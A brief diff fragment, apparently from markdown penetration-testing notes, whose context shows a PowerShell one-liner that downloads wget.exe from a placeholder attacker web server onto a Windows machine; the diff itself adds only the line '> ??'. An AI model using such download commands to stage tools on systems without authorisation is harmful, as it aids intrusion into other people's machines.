@@ -305,3 +305,4 @@ sudo systemctl start apache2
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{localIP}/wget.exe','C:\Users\{wget.exe Path}')"
 ```
 ![image](https://hackmd.io/_uploads/Sk_svOKDC.png)
+> ??
